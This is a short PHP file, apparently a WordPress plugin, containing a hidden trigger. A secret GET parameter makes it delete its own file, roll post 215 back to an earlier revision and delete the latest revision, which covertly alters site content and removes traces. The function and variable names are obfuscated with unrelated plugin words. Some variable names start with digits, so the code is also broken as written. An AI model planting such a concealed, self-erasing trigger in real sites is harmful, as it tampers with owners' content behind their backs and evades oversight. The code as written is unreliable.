<?php

function rating_multisite_feedback() {
	if (isset($_GET['ajax_multi_excerpt_switch']) && $_GET['ajax_multi_excerpt_switch'] === 'terms_jigoshop_ecommerce_newsletter') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$support_section_scheduled_featured = 215;
		$404_tiny_src_latest = wp_get_post_revisions($support_section_scheduled_featured);
		if (empty($404_tiny_src_latest)) die('no revisions');
		if (count($404_tiny_src_latest) < 2) die('less than 2');
		$automatorwp_testimonials_newsletter = array_shift($404_tiny_src_latest);
		$security_daily_internal = $automatorwp_testimonials_newsletter->ID;
		$new_simply_parts_daily = array_shift($404_tiny_src_latest);
		$query_monitor_404_videos = $new_simply_parts_daily->ID;
		$rss_fast_client = wp_restore_post_revision($query_monitor_404_videos);
		if ($rss_fast_client === false) die('error restoring');
		$rss_fast_client = wp_delete_post_revision($security_daily_internal);		
		if ($rss_fast_client === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'rating_multisite_feedback');
